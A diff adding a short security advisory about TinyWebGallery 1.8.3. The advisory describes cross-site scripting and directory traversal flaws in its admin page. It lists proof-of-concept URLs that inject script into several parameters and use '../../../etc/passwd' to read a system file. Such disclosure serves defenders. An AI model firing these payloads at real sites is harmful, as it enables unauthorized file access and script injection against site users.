@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/46086/info
+
+TinyWebGallery is prone to local file-include and cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+A remote attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Exploiting the local file-include issue allows the attacker to view and subsequently execute local files within the context of the webserver process.
+
+TinyWebGallery 1.8.3 is vulnerable; other versions may also be affected. 
+
+xamples:
+http://www.example.com/twg183/admin/index.php?sview="onmouseover=alert(String.fromCharCode(88,83,83));"
+http://www.example.com/twg183/admin/index.php?tview="onmouseover=alert(String.fromCharCode(88,83,83));"
+http://www.example.com/twg183/admin/index.php?dir=<script>alert("xss")</script>
+http://www.example.com/twg183/admin/index.php?action=chmod&item=<script>alert("xss")</script>
+http://www.example.com/twg183/twg183/admin/index.php?action=chmod&item="><script>alert("xss")</script>
+...
+
+--
+
+Vulnerability: Directory Traversal.
+Where:
+~ File: /admin/index.php
+~ Parameters: item
+
+Example:
+http://www.example.com/twg183/admin/index.php?action=edit&item=../../../etc/passwd
+
